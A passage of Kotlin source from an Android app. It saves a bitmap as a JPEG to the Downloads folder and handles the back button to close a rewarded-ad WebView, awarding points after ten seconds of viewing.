            val fileName = "x24_screen_${System.currentTimeMillis()}.jpg"

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val resolver = applicationContext.contentResolver
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                    put(MediaStore.MediaColumns.MIME_TYPE, "image/jpeg")
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                }

                val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
                if (uri != null) {
                    resolver.openOutputStream(uri)?.use { outputStream ->
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, outputStream)
                    }
                    Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
                } else {
                    Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
                }
            } else {
                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val file = File(downloadsDir, fileName)
                FileOutputStream(file).use { fos ->
                    bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, fos)
                }
                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Error saving screen image: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (adWebViewContainer.visibility == View.VISIBLE) {
            val elapsedTime = System.currentTimeMillis() - adStartTime
            adWebViewContainer.visibility = View.GONE
            adWebView.loadUrl("about:blank") // Clear content

            if (elapsedTime >= 10000) {
                // Ad viewed for at least 10 seconds, award points
                val earnedPoints = (50..100).random()
                pointsManager.addPoints(earnedPoints)
                updatePointsUI()
                Toast.makeText(this, "You earned $earnedPoints points!", Toast.LENGTH_LONG).show()
            } else {
                Toast.makeText(this, "Ad closed too early. You need to watch for at least 10s.", Toast.LENGTH_SHORT).show()
            }
            return
        }
        super.onBackPressed()
    }

}
